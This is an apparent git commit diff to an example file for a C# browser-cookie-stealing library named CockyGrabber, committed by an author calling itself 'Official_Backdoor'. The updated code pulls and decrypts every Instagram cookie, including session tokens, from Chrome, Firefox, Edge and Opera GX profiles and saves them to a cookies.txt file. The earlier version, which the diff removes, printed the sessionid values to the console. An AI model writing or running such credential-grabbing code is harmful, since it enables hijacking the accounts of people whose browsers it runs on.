cd46542b0655f2be41407344b5765eae903513dc
Official_Backdoor <61780641+TheBackdoor@users.noreply.github.com>
2020-12-23 00:04:09 +0100

    Update and rename InstagramGrabber.cs to InstagramCookieGrabber.cs

--- Examples/InstagramCookieGrabber.cs
+++ Examples/InstagramCookieGrabber.cs
@@ -1,53 +1,45 @@
 using CockyGrabber;
 using System;
-namespace grabber
+namespace GrabberExamples
 {
     class Program
     {
         static void Main(string[] args)
         {
+            StringBuilder instagramCookies = new StringBuilder();
+            
             ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
             if (cg.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".instagram.com", cg.GetKey()))
                 {
-                    if (item.Name == ("sessionid"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (fg.CookiesExists())
             {
                 foreach (var item in fg.GetCookiesByHostname(".instagram.com"))
                 {
-                    if (item.Name == (".c"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (eg.CookiesExists())
             {
                 foreach (var item in eg.GetCookiesByHostname(".instagram.com", eg.GetKey()))
                 {
-                    if (item.Name == ("sessionid"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
-                    
+                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (og.CookiesExists())
             {
                 foreach (var item in og.GetCookiesByHostname(".instagram.com", og.GetKey()))
                 {
-                    if (item.Name == ("sessionid"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
+            
+            File.WriteAllText("cookies.txt", instagramCookies.ToString());
+            Console.WriteLine("Cookies Grabbed and saved Successfully!");
             Console.ReadKey();
         }
     }
